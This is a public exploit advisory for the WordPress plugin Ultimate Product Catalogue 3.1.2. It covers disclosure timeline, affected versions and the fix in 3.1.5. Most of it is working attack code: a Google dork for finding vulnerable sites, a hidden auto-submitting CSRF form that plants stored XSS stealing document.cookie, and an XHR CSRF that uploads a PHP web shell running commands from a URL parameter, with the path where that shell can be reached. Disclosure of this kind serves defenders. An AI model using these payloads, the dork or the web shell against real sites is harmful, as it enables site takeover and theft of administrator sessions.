@@ -1,0 +1,144 @@
+# Exploit Title: Multiple Persistent XSS & CSRF & File Upload on Ultimate
+Product Catalogue 3.1.2
+# Google Dork: inurl:"SingleProduct" intext:"Back to catalogue"
+intext:"Category",
+inurl:"/wp-content/plugins/ultimate-product-catalogue/product-sheets/"
+# Date: 22/04/2015
+# Exploit Author: Felipe Molina de la Torre (@felmoltor)
+# Vendor Homepage: https://wordpress.org/plugins/ultimate-product-catalogue/
+# Software Link:
+https://downloads.wordpress.org/plugin/ultimate-product-catalogue.3.1.2.zip
+# Version: <= 3.1.2, Comunicated and Fixed by the Vendor in 3.1.5
+# Tested on: Linux 2.6, PHP 5.3 with magic_quotes_gpc turned off, Apache
+2.4.0 (Ubuntu)
+# CVE : N/A
+# Category: webapps
+
+1. Summary:
+
+Ultimate Product Catalogue is a responsive and easily customizable plugin
+for all your product catalogue needs. It has +63.000 downloads, +4.000
+active installations.
+
+Product Name and Description and File Upload formulary of plugin Ultimate
+Product Catalog lacks of proper CSRF protection and proper filtering.
+Allowing an attacker to alter a product pressented to a customer or the
+wordpress administrators and insert XSS in his product name and
+description. It also allows an attacker to upload a php script though a
+CSRF due to a lack of file type filtering when uploading it.
+
+2. Vulnerability timeline:
+- 22/04/2015: Identified in version 3.1.2
+- 22/04/2015: Comunicated to developer company etoilewebdesign.com
+
+- 22/04/2015: Response from etoilewebdesign.com
+
+ and fixed two SQLi in 3.1.3 but not these vulnerabilities.
+        - 28/04/2015: Fixed version in 3.1.5 without notifying me.
+
+3. Vulnerable code:
+
+    In file html/ProductPage multiple lines.
+
+3. Proof of concept:
+
+https://www.youtube.com/watch?v=roB_ken6U4o
+
+
+ ----------------------------------------------------------------------------------------------
+   ------------- CSRF & XSS in Product Description and Name -----------
+
+ ----------------------------------------------------------------------------------------------
+
+<iframe width=0 height=0 style="display:none" name="csrf-frame"></iframe>
+<form method='POST'
+    action='http://
+<web>/wp-admin/admin.php?page=UPCP-options&Action=UPCP_EditProduct&Update_Item=Product&Item_ID=16'
+    target="csrf-frame"
+    id="csrf-form">
+        <input type='hidden' name='action' value='Edit_Product'>
+        <input type='hidden' name='_wp_http_referer'
+value='/wp-admin/admin.php?page=UPCP-options&Action=UPCP_EditProduct&Update_Item=Product&Item_ID=16'/>
+        <input type='hidden' name='Item_Name' value="Product
+name</a><script>alert('Product Name says: '+document.cookie)</script><a>"/>
+        <input type='hidden' name='Item_Slug' value='asdf'/>
+        <input type='hidden' name='Item_ID' value='16'/>
+        <input type='hidden' name='Item_Image' value='
+http://i.imgur.com/6cWKujq.gif'>
+        <input type='hidden' name='Item_Price' value='666'>
+        <input type='hidden' name='Item_Description' value="Product
+description says<script>alert('Product description says:
+'+document.cookie)</script>"/>
+        <input type='hidden' name='Item_SEO_Description' value='seo desc'>
+        <input type='hidden' name='Item_Link' value=''>
+        <input type='hidden' name='Item_Display_Status' value='Show'>
+        <input type='hidden' name='Category_ID' value=''>
+        <input type='hidden' name='SubCategory_ID' value=''>
+        <input style="display:none" type='submit' value='submit'>
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
+
+
+
+ ----------------------------------------------------------------------------------------------
+   -------- CSRF & File Upload in Product Description and Name ------
+
+ ----------------------------------------------------------------------------------------------
+
+<html>
+    <body onload="submitRequest();">
+        <script>
+          function submitRequest()
+          {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST",
+"http://<web>/wp-admin/admin.php?page=UPCP-options&Action=UPCP_AddProductSpreadsheet&DisplayPage=Product",
+true);
+            xhr.setRequestHeader("Host", "<web>");
+            xhr.setRequestHeader("Accept",
+"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+            xhr.setRequestHeader("Cache-Control", "max-age=0");
+            xhr.setRequestHeader("Accept-Language",
+"en-US,en;q=0.8,es;q=0.6");
+            xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT
+6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.37
+Safari/537.36");
+            xhr.setRequestHeader("Accept-Encoding", "gzip, deflate");
+            xhr.setRequestHeader("Content-Type", "multipart/form-data;
+boundary=----WebKitFormBoundarylPTZvbxAcw0q01W3");
+            var body = "------WebKitFormBoundarylPTZvbxAcw0q01W3\r\n" +
+              "Content-Disposition: form-data;
+name=\"Products_Spreadsheet\"; filename=\"cooldog.php\"\r\n" +
+              "Content-Type: application/octet-stream\r\n" +
+              "\r\n" +
+              "<?php\r\n" +
+              "exec($_GET['c'],$output);\r\n" +
+              "foreach ($output as $line) {\r\n" +
+              "echo \"<br/>\".$line;\r\n" +
+              "}\r\n" +
+              "?>\r\n" +
+              "------WebKitFormBoundarylPTZvbxAcw0q01W3\r\n" +
+              "Content-Disposition: form-data; name='submit'\r\n" +
+              "\r\n" +
+              "Add New Products\r\n" +
+              "------WebKitFormBoundarylPTZvbxAcw0q01W3--\r\n" ;
+            var aBody = new Uint8Array(body.length);
+            for (var i = 0; i < aBody.length; i++)
+              aBody[i] = body.charCodeAt(i);
+            xhr.send(new Blob([aBody]));
+          }
+        </script>
+        <form action="#">
+          <input style="display:none;" type="submit" value="Up!"
+onclick="submitRequest();" />
+      </form>
+  </body>
+</html>
+
+Te file cooldog.php is no available in path http://
+<web>/wp-content/plugins/ultimate-product-catalogue/product-sheets/cooldog.php
+
+
+4. Solution:
+
+    Update to version 3.1.5
